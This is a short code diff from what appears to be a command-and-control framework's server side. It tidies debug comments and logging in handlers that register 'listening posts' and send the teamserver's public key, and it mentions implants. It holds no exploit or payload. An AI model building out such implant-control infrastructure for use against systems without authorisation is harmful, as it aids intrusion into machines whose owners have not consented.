@@ -22,8 +22,7 @@ def lp_init(frame, teamserver):
     data = {'component_id': frame['component_id'], "cmd": "lpo", "args": [{"tpk": teamserver.initial_public_key._public_key}],
             "txid": frame['txid']}
     instruction_frame = instructions.create_instruction_frame(data)
-    # TODO: value setting
-    reply_frame = instruction_frame  # Debug, will be encoded once cooked
+    reply_frame = instruction_frame
     return reply_frame
 
 
@@ -40,11 +39,11 @@ def lp_initialized(frame, teamserver):
     """
     data = {'component_id': frame['component_id'], "cmd": "lpmo", "args": [{"tpk": teamserver.initial_public_key._public_key}],
             "txid": frame['txid']}
-    # TODO: Value setting
+    # TODO: Value setting, cooking
     instruction_frame = instructions.create_instruction_frame(data)
-    reply_frame = instruction_frame  # Debug, will be encoded once cooked
+    reply_frame = instruction_frame
     teamserver.logging.log(f"Got new listening post! ID: {reply_frame['component_id']}", source="lib.listener")
-    # f"Implants: {reply_frame['args']['implant_count']}", # TODO: list index must be int, not str
+
 
     return reply_frame
 
